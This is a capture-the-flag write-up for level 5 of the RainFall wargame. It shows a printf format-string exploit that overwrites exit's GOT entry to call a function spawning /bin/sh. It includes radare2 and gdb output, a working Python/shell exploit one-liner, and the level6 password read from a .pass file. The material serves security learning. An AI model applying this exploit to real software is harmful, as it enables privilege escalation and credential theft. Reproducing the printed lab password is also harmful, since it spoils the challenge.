# Level 5

Another `printf` format string exploit, except this time we won't get a shell by setting a value to a variable, instead we have to call the function `o`...

```shell
r2 ./level5
[0x080483f0]> aaa
[...]
[0x080483f0]> afl
0x080483f0    1 33           entry0
[...]
0x080484a4    1 30           sym.o
[0x080483f0]> s sym.o
[0x080484a4]> pdf
┌ 30: sym.o ();
│           0x080484a4      55             push ebp
│           0x080484a5      89e5           mov ebp, esp
│           0x080484a7      83ec18         sub esp, 0x18
│           0x080484aa      c70424f08504.  mov dword [esp], str._bin_sh ; [0x80485f0:4]=0x6e69622f ; "/bin/sh" ; const char *string
│           0x080484b1      e8fafeffff     call sym.imp.system         ; int system(const char *string)
│           0x080484b6      c70424010000.  mov dword [esp], 1          ; int status
└           0x080484bd      e8cefeffff     call sym.imp._exit          ; void _exit(int status)
```

## Another day, Another %p

As usual let's check where our buffer starts in the stack
```shell
level5@RainFall:~$ ./level5 <<< `python -c 'print "0000" + "%p|"*20'`
00000x200|0xb7fd1ac0|0xb7ff37d0|0x30303030|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0x257c7025|0x70257c70|0x7c70257c|0xa|
level5@RainFall:~$ ./level5 <<< `python -c 'print "0000" + "%p|"*4'`
00000x200|0xb7fd1ac0|0xb7ff37d0|0x30303030|
level5@RainFall:~$ ./level5 <<< `python -c 'print "0000%4$p"'`
00000x30303030
```
Ok perfect, now what?

## Pesky exit

```asm
0x080484e5      e8b6feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
0x080484ea      8d85f8fdffff   lea eax, [format]
0x080484f0      890424         mov dword [esp], eax        ; const char *format
0x080484f3      e888feffff     call sym.imp.printf         ; int printf(const char *format)
0x080484f8      c70424010000.  mov dword [esp], 1          ; int status
0x080484ff      e8ccfeffff     call sym.imp.exit           ; void exit(int status)
```


What if we just replaced the address of `exit()` with the address of `o`? let's try!

## The GOT

The Global Offset Table holds the adresses of functions that are dynamically linked, luckily for us it is writeable!

First let's get the value of `exit` in the GOT, before the program can replace it
```shell
level5@RainFall:~$ gdb ./level5
[...]
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
(gdb) p o
$1 = {<text variable, no debug info>} 0x80484a4 <o>
```

We need to override the value of `0x8049838` with the address of `o`, `0x80484a4`
sadly, struct.pack() adds some padding when used with stdin, so we'll have to passes the address in little endian directly.
```shell
level5@RainFall:~$ (python -c 'print "\x38\x98\x04\x08" + "%{}p".format(str(0x80484a4-4)) + "%4$n"'; cat -)  | ./level5 | tr -d ' '
0x200
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
🚀
